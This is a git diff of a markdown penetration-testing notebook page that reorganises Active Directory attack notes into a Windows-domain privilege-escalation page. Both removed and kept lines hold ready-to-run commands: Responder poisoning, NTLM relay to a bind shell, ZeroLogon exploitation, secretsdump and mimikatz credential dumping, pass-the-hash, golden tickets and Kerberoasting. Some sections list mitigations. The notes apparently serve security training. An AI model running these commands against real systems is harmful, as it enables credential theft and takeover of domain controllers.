@@ -1,7 +1,7 @@
 ---
-title: 3 - Active Directory Exploitation
-summary: Gaining Access step – a note for attacking Windows.
-description: Gaining Access step – a note for attacking Windows.
+title: 5 – Privesc Windows Domain
+summary: Privilege Escalation step – a note for elevating privileges on a Windows Domain.
+description: Privilege Escalation step – a note for elevating privileges on a Windows Domain.
 ---
 
 # Resources
@@ -14,209 +14,19 @@ description: Gaining Access step – a note for attacking Windows.
 ![killchain-AD-attacks_mind_map.png](../attachments/killchain-AD-attacks_mind_map.png) 
 Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm
 
-# Initial Access
-
----
-
-### 1 - LLMNR Attack
-
-### Principle
-
-![exploit-llmnr-principle.png](../attachments/exploit-llmnr-principle.png)
-Credit: TCM Security
-
-### Hands On
-
-
- > 
- > **<font color=red>responder -l</font> tun0 <font color=red>-dw</font>**</br>
- > Capture NTLM Hashes when DNS error occurs.
-
-![tool-responder-llmnr_hash_capture.png](../attachments/tool-responder-llmnr_hash_capture.png)
-
-
- > 
- > **<font color=red>hashcat -a 0 -m 5600 </font>myHashes.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
- > Crack NetNTMLv2 hashes.
-
-### Mitigation
-
-* Disable LLMNR and NBT-NS
-  * Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client > Multicast Name Resolution > OFF
-  * Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced > WINS > NetBIOS over TCP/IP > Disable
-* If this cannot be disabled
-  * Network Access Control.
-  * Enforce strong user password (over 14 characters) in order to make it harder to crack hashes.
-
-Credit: TCM Security
-
----
-
-### 2 - SBM Relay Attack
-
-### Principle
-
-Relay captured Hashes without cracking them to a SMB Server.
-
-### Requirements & Limitations
-
-* SMB Signing must be disabled on the target.
-* The user that is relayed has to be admin on the target.
-* It is not possible to relay a user to the same machine.
-
-### Scan for vulnerable hosts (SMB Signing disabled)
-
-**<font color=red>nmap --script=smb2-security-mode.nse -p445</font> \[TARGET_IP\]**</br>
-Scan for disabled SMB Signing.
-
-![tool-nmap-smb_signing.png](../attachments/tool-nmap-smb_signing.png)
-
-### Hands on
-
-#### Capture Hashes
-
-Update Responder configuration to capture hashes but not respond.
-
- > 
- > **<font color=lightblue>/usr/share/responder/Responder.conf</font>**</br>
-
-````
-[Responder Core]
-
-; Servers to start
-SQL = On
-#SMB = On # HERE #
-RDP = On
-Kerberos = On
-FTP = On
-POP = On
-SMTP = On
-IMAP = On
-HTTP = On
-HTTPS = On
-DNS = On
-LDAP = On
-DCERPC = On
-WINRM = On
-SNMP = Off
-````
-
-
- > 
- > **<font color=red>responder -l</font> tun0 <font color=red>-dw</font>**</br>
- > Capture NTLM Hashes when DNS error occurs.
-
-![tool-responder-llmnr_hash_capture.png](../attachments/tool-responder-llmnr_hash_capture.png)
-
-#### Relay Attacks
-
-
- > 
- > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf </font>myTargets.txt <font color=red>-smb2support --no-multirelay</font>**</br>
- > Relay NTLM Hash and Dump Sam Hashes.
-
-![tool-ntlmrelayx-smb_relay_dump_sam.png.png](../attachments/tool-ntlmrelayx-smb_relay_dump_sam.png.png)
-
-**TO CHECK**
-
- > 
- > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf</font> myTargets.txt <font color=red>-smb2support --no-multirelay -i</font>**</br>
- > Relay NTLM Hash and start a Bind Shell.
-
-![tool-ntmlrelayx-smb_relay_reverse_shell.png](../attachments/tool-ntmlrelayx-smb_relay_reverse_shell.png)
-
- > 
- > **<font color=red>nc 127.0.0.1 11000</font>**
- > Connect to the shell.
-
-### Mitigation
-
-* Enable SMB Signing on all devices
-  * Warning: May cause performance issues with file copies
-* Disable NTML authentication on network
-  * Warning: NTML is the backup solution when Kerberos don't work, NTML may be required by some applications.
-* Limit high privilege accounts to specific tasks (e.g. Domain Admins only log when a Domain Admin access is required).
-* Enforce Local admins restriction.
-
-Credit: TCM Security
-
----
-
-### Find Valid Users (Brute Force)
-
-
- > 
- > **<font color=red>kerbrute -dc-ip</font> \[TARGET_DC_IP\] <font color=red>-domain</font> \[TARGET_DOMAIN\] <font color=red>-users </font>myUserList.txt <font color=red>-t</font> 10**
- > Find valid users by testing all usernames in a list (`-t` is for thread).
-
----
-
-### Find Users with No Pre-Authentication Required
-
-
- > 
- > **<font color=red>python3 /opt/impacket/examples/GetNPUsers.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>myUser <font color=red>-dc-ip</font> \[TARGET_DC_IP\] <font color=red>-no-pass</font>**</br>
- > Check for users that do not require Pre-Authentication.
-
----
-
-### ZeroLogon Exploit (CVE-2020-1472)
-
-### Warning
-
-This exploit could destroy the Domain Controller if you don’t restore the password after the attack.
-
-### Check if Vulnerable
-
-**https://github.com/SecuraBV/CVE-2020-1472** 
-
- > 
- > **<font color=red>python3 zerologon_tester.py</font> myNetBIOSDCName \[TARGET_DC_IP\]**</br>
- > Check if target is vulnerable to CVE-2020-1472
-
-### Hands On
-
-#### Exploit
-
-**https://github.com/Sq00ky/Zero-Logon-Exploit/blob/master/zeroLogon-NullPass.py** 
-
- > 
- > **<font color=red>python3 zeroLogon-NullPass.py </font>myNetBIOSDCName \[TARGET_DC_IP\]**</br>
- > Run the exploit: bypass authentication and change the password to a null value. 
-
-#### Hash Dump
-
-
- > 
- > **<font color=red>python3 /opt/impacket/examples/secretsdump.py </font>myNetBIOSDCName<font color=red>\\$@</font>\[TARGET_DC_IP\] <font color=red>-no-pass</font>**</br>
- > Connect with empty password (after Zerologon exploit) and dump hashes. 
-
-#### Pass the Hash
-
-
- > 
- > **<font color=red>evil-winrm -i</font> \[TARGET_IP\] <font color=red>-u</font> \[myUser\] <font color=red>-H </font>\[myUserNTHASH\]**</br>
- > Pass the Hash attack (NT Hash).
-
-#### Restore the machine state
-
- > 
- > **<font color=red>python3 /opt/impacket/examples/secretsdump.py</font> Administrator<font color=red>@</font>\[TARGET_DC_IP\] <font color=red>-hashes</font> myAdminHash**</br>
- > Dump secrets, look for `plain_password_hex`.
-
-**https://github.com/dirkjanm/CVE-2020-1472** 
-
- > 
- > **<font color=red>python3 restorepassword.py </font>DOMAIN<font color=red>/</font>myNetBIOSDCName<font color=red>@</font>myNetBIOSDCName <font color=red>-target-ip</font> \[TARGET_DC_IP\] <font color=red>-hexpass</font> myPlainPasswordHex**
- > Restore the password.
-
 # Enumeration
 
-# Privilege Escalation
+---
+
+### POWERVIEW
+
+!!!
+
+# Pass the Password
 
 ---
 
-### Pass the Password
+### IMPACKET-PSEXEC
 
 ### Hands On
 
@@ -240,9 +50,11 @@ This exploit could destroy the Domain Controller if you don’t restore the pass
  > **<font color=red>python3 /opt/impacket/examples/wmiexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
  > Get a shell on the tageted machine.
 
+# GPP Attack
+
 ---
 
-### GPP Attack
+### GPP-DECRYPT
 
 ### Principle
 
@@ -264,9 +76,11 @@ The encryption key was released, so it is possible to decrypt GPP policies that 
  > **<font color=red>gpg-decrypt</font> mycPasswordEncrypted**</br>
  > Decrypt GPP enmbedded credentials.
 
+# Hash Dump
+
 ---
 
-### Hash Dump (Remote)
+### IMPACKET-SECRETDUMP (Remote)
 
 
  > 
@@ -275,7 +89,7 @@ The encryption key was released, so it is possible to decrypt GPP policies that 
 
 ---
 
-### Hash Dump (Local)
+### MIMIKATZ (On Target)
 
 
  > 
@@ -295,9 +109,11 @@ The encryption key was released, so it is possible to decrypt GPP policies that 
  > **<font color=red>sekurlsa::logonpasswords</font>**</br>
  > Dump Hashes from LSAA Memory (Hashes of currently logged-in users).
 
+# Pass the Hash
+
 ---
 
-### Pass the Hash
+### CRACKMAPEXEC, EVIL-WINRM or IMPACKET-PSEXEC
 
 ### Theory
 
@@ -345,9 +161,11 @@ There are two different hash types, `LM` and `NT`:
   * Rotate password on a regular basis.
     Credit: TCM Security
 
+# Pass the Ticket
+
 ---
 
-### Pass the Ticket
+### MIMIKATZ
 
 ### Hands On
 
@@ -377,9 +195,11 @@ There are two different hash types, `LM` and `NT`:
  > **<font color=red>kerberos::ptt</font> myTicketFromSekurlsa<font color=red>.kirbi</font>**</br>
  > Cache and impersonate the given ticket.
 
+# Token Impersonation
+
 ---
 
-### Token Impersonation
+### METERPRETER
 
 ### Theory
 
@@ -423,9 +243,11 @@ The safest to pick is **services.exe**.
 
 * Limit user/group token creation permissions.
 
+# Kerberoasting
+
 ---
 
-### Kerberoasting
+### IMPACKET-GETUSERSPNS
 
 ### Principle
 
@@ -447,9 +269,11 @@ The safest to pick is **services.exe**.
 * Have a very strong password for service accounts.
 * Don’t make services accounts domain administrators.
 
+# Golden/Silver Ticket
+
 ---
 
-### Golden/Silver Ticket
+### MIMIKATZ
 
 ### Principle
 
@@ -494,6 +318,8 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
  > 
  > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**
  > Get a shell on the machine.
+
+# Exploit
 
 ---
 
